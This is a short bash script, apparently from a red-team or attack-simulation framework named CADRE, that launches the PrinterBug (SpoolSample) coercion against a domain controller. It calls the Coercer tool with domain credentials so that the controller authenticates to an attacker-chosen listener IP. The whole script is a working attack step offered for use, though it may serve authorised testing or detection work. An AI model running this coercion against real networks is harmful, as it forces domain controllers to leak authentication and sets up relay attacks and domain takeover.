#!/bin/bash
# CADRE — WT#017 PrinterBug (SpoolSample)
ATTACK_IP="${1:-$(hostname -I | awk '{print $1}')}"
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#017 — PrinterBug (SpoolSample)"
start_attack "017" "PrinterBug (SpoolSample)"

require_tool coercer
require_env ATTACK_IP "ATTACK_IP"
require_env DC01 "DC01"
require_env DOMAIN_ROOT "DOMAIN_ROOT"
require_env ATTACK_USER "ATTACK_USER"
require_env ATTACK_PASS "ATTACK_PASS"

step "Step 1: Trigger SpoolSample coercion via Coercer"
run_cmd "coercer coerce -l $ATTACK_IP -t $DC01 -d $DOMAIN_ROOT -u $ATTACK_USER -p '$ATTACK_PASS' --spoolsample"

result $? "PrinterBug (SpoolSample) coercion completed"
